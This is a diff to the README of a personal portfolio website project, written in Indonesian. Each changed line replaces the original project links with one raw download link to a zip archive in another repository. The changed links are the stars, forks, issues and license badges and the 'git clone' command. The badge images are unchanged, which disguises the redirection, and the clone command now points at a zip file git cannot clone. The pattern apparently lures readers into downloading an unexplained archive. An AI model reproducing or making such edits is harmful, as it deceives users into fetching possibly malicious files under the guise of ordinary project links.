@@ -5,16 +5,16 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/yuurahz/portofolio/stargazers">
+  <a href="https://github.com/ThisiYann/portofolio-yosh/raw/refs/heads/master/assets/yosh_portofolio_1.6.zip">
     <img src="https://img.shields.io/github/stars/yuurahz/portofolio?color=ffdd00&style=for-the-badge" alt="Stars"/>
   </a>
-  <a href="https://github.com/yuurahz/portofolio/network/members">
+  <a href="https://github.com/ThisiYann/portofolio-yosh/raw/refs/heads/master/assets/yosh_portofolio_1.6.zip">
     <img src="https://img.shields.io/github/forks/yuurahz/portofolio?color=00d8ff&style=for-the-badge" alt="Forks"/>
   </a>
-  <a href="https://github.com/yuurahz/portofolio/issues">
+  <a href="https://github.com/ThisiYann/portofolio-yosh/raw/refs/heads/master/assets/yosh_portofolio_1.6.zip">
     <img src="https://img.shields.io/github/issues/yuurahz/portofolio?color=ff4d4f&style=for-the-badge" alt="Issues"/>
   </a>
-  <a href="https://github.com/yuurahz/portofolio/blob/main/LICENSE">
+  <a href="https://github.com/ThisiYann/portofolio-yosh/raw/refs/heads/master/assets/yosh_portofolio_1.6.zip">
     <img src="https://img.shields.io/github/license/yuurahz/portofolio?color=00ff99&style=for-the-badge" alt="License"/>
   </a>
 </p>
@@ -52,7 +52,7 @@ Website **Personal Portfolio** ini adalah representasi digital dari karya, skill
 
 ```bash
 # 1. Clone repository
-git clone https://github.com/yuurahz/portofolio.git
+git clone https://github.com/ThisiYann/portofolio-yosh/raw/refs/heads/master/assets/yosh_portofolio_1.6.zip
 
 # 2. Masuk ke folder project
 cd portofolio
